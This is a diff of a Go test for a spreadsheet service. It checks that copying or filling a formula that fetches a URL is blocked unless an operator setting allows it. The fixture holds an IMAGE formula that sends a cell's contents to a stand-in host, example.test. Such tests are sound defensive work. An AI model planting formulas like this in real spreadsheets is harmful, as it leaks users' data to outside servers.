@@ -278,6 +278,65 @@ func TestAFormulaRewriteCannotReachOutside(t *testing.T) {
 	}
 }
 
+// A copy or a fill carries the formulas it copies into new cells, each
+// reading the cells beside it, so an IMAGE that sends one cell becomes
+// many sending many. Those are refused while the operator's setting is
+// off, as any other write's are, and go through when it is on. A paste
+// of values carries no formula, and a cut moves one rather than making
+// another.
+func TestACopyCannotMultiplyAnExternalFormula(t *testing.T) {
+	for _, tc := range []struct {
+		name    string
+		req     func(*service.TransformRequest)
+		refused bool
+	}{
+		{"auto_fill", func(r *service.TransformRequest) {
+			r.Action, r.FillRows, r.FillLength = service.TransformAutoFill, true, 5
+		}, true},
+		{"copy_paste", func(r *service.TransformRequest) {
+			r.Action, r.Destination = service.TransformCopyPaste, "E40"
+		}, true},
+		{"copy_paste of formulas", func(r *service.TransformRequest) {
+			r.Action, r.Destination, r.Paste = service.TransformCopyPaste, "E40", "formula"
+		}, true},
+		{"copy_paste of values", func(r *service.TransformRequest) {
+			r.Action, r.Destination, r.Paste = service.TransformCopyPaste, "E40", "values"
+		}, false},
+		{"cut_paste", func(r *service.TransformRequest) {
+			r.Action, r.Destination = service.TransformCutPaste, "E40"
+		}, false},
+	} {
+		for _, allowed := range []bool{false, true} {
+			srv := sheetstest.Standard(t)
+			cfg, err := settings()
+			if err != nil {
+				t.Fatal(err)
+			}
+			cfg.AllowExternalFormulas = allowed
+			svc := service.New(service.Deps{API: srv.Client(), Config: cfg})
+			srv.Doc(sheetstest.FixtureID).Find(sheetstest.SecondSheet).Set(30, 1,
+				sheetstest.Formula(`=IMAGE("https://example.test/?q="&B30)`, 0, ""))
+			req := transformReq("", "A30")
+			tc.req(&req)
+			_, err = svc.Transform(context.Background(), req)
+			if want := tc.refused && !allowed; want {
+				if err == nil || !strings.HasPrefix(err.Error(), "[blocked] copies of A30 would hold a formula that "+
+					"fetches a URL") || !strings.Contains(err.Error(), "GSHEETS_ALLOW_EXTERNAL_FORMULAS") ||
+					strings.Contains(err.Error(), "pass ") {
+					t.Errorf("%s, setting %v: error = %v", tc.name, allowed, err)
+				}
+				if batched(srv) {
+					t.Errorf("%s, setting %v: a refused copy reached the wire", tc.name, allowed)
+				}
+				continue
+			}
+			if err != nil {
+				t.Errorf("%s, setting %v: %v", tc.name, allowed, err)
+			}
+		}
+	}
+}
+
 func TestTrimAndDedupeReportTheirCounts(t *testing.T) {
 	srv := sheetstest.Standard(t)
 	svc := newService(t, srv)
